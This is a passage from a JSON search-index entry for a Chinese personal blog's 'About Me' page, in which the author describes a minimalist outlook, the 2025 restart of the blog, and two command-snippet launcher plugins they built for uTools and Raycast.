因为自己经常使用一些 Linux 命令片段和 Prompt，所以写了一个易于检索粘贴的 uTools 插件：快命令\n在一些朋友的建议下，又写了 Raycast 版本：Swift Command ，进一步提升了 Mac 下的使用体验\n如果你有类似需求，希望它可以帮到你\n联系 Email: AaronLinV@outlook.com\n","permalink":"https://aaronlinv.github.io/about/","summary":"\u003ch3 id=\"自留地\"\u003e自留地\u003c/h3\u003e\n\u003cp\u003e看着越来越多消失的博客，2025 年初重新开始倒腾 Pages\u003c/p\u003e\n\u003cp\u003e越来越逼仄的空间，退无可退，不如坦然面对\u003c/p\u003e\n\u003ch3 id=\"极简主义\"\u003e极简主义\u003c/h3\u003e\n\u003cp\u003e践行极简主义，删繁就简，做少少的事，爱具体的人\u003c/p\u003e\n\u003cp\u003e简单让我自由，不重要的东西就应该被忘记\u003c/p\u003e\n\u003ch3 id=\"快命令\"\u003e快命令\u003c/h3\u003e\n\u003cp\u003e因为自己经常使用一些 Linux 命令片段和 Prompt，所以写了一个易于检索粘贴的 uTools 插件：\u003ca href=\"https://www.u-tools.cn/plugins/detail/%E5%BF%AB%E5%91%BD%E4%BB%A4/\"\u003e快命令\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在一些朋友的建议下，又写了 Raycast 版本：\u003ca href=\"https://www.raycast.com/aaron_lin/swift-command\"\u003eSwift Command\n\u003c/a\u003e，进一步提升了 Mac 下的使用体验\u003c/p\u003e\n\u003cp\u003e如果你有类似需求，希望它可以帮到你\u003c/p\u003e\n\u003ch3 id=\"联系\"\u003e联系\u003c/h3\u003e\n\u003cp\u003eEmail: \u003ca href=\"mailto:AaronLinV@outlook.com\"\u003eAaronLinV@outlook.com\u003c/a\u003e\u003c/p\u003e","title":"About Me"}]